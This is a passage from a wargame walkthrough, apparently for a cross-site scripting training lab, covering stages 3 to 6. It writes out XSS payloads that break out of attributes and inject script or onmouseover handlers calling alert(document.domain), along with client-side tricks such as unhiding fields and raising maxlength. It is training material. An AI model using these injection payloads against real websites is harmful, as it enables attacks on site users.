

# stage3:
When we intercept the request in burp we can see 2 fields , I tried one but the hint said "html escaping" is there so not point , so I tried this one and it worked
![[walkthroughs/wargames/IMG/Pasted image 20230812170855.png]]
`"><script>alert(document.domain)</script>`

# stage 4:
do from hidden to text we get a new field
![[walkthroughs/wargames/IMG/Pasted image 20230812171211.png]]
![[walkthroughs/wargames/IMG/Pasted image 20230812171916.png]]
payload:`"onmouseover="alert(document.domain)`

# stage 5
There was a length limit:
![[walkthroughs/wargames/IMG/Pasted image 20230812172956.png]]
did max length from 15 to 50, here it's being loaded:
![[walkthroughs/wargames/IMG/Pasted image 20230812173044.png]]
![[walkthroughs/wargames/IMG/Pasted image 20230812173155.png]]
`"onmouseover="alert(document.domain)`
# stage 6:
just paste the same query again:
![[walkthroughs/wargames/IMG/Pasted image 20230812173255.png]]
`"onmouseover="alert(document.domain)`
